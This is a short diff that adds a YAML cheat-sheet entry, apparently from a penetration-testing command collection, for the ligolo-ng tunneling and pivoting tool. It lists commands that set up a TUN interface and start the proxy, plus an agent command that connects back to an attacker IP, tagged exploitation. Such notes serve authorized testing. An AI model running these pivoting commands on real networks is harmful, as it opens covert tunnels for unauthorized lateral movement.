@@ -1,0 +1,25 @@
+name: ligolo-ng
+description: |
+  An advanced, yet simple, tunneling/pivoting tool that uses a TUN interface.
+  Once an agent connects. Interact with it:
+  - sessions
+  - <ENTER>
+  - start
+commands:
+  - command: |
+      ip tuntap add user kali mode tun ligolo
+      ip link set ligolo up
+      ./proxy -selfcert
+      ip route add $IP/24 dev ligolo
+    description: Setup interface and start ligolo-ng server.
+  - command: |
+      ./agent -connect 10.10.14.5:11601 -ignore-cert
+    description: Agent connects to attacker.
+tags:
+  - exploitation
+  - pivoting
+show:
+links:
+  -
+references:
+  - https://github.com/nicocha30/ligolo-ng
